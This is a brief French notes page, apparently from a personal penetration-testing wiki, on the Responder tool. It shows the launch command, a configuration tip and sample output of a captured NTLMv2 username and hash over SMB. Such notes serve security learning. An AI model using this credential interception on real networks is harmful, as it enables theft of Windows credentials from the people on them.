<sub>[Procédure serveur](server_procedure.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Cryptage](cryptage.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Outils](tools.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Sites utiles](useful_website.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Lexique](lexique.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Index](index.md)</sub>
<sub>[Retour](index.md)</sub>
#Responder

**Présentation :** outil d'attaques en tout genres

**Utilisation :**
- Authentification [Windows](windows.md)
- [SMB](smb.md)

**CMD :** sudo responder -I ***INTERFACE***

**Help :**
- si un soucis pour démarrer sur un port comme HTTP : vérifier que dans le usr/share/responder/Responder.conf => server to start => HTTP est bien à Off

**Procédure :**
- responder va faire ????? comme intercepter l authentification Windows via serveur SMB
- on le met à écouter et on va déclencher un évènement. ex : il intercepte username et hash
  <code>[SMB] NTLMv2-SSP Client   : 10.10.10.10
  [SMB] NTLMv2-SSP Username : RESPONDER\Administrator
  [SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:*HASH*</code>
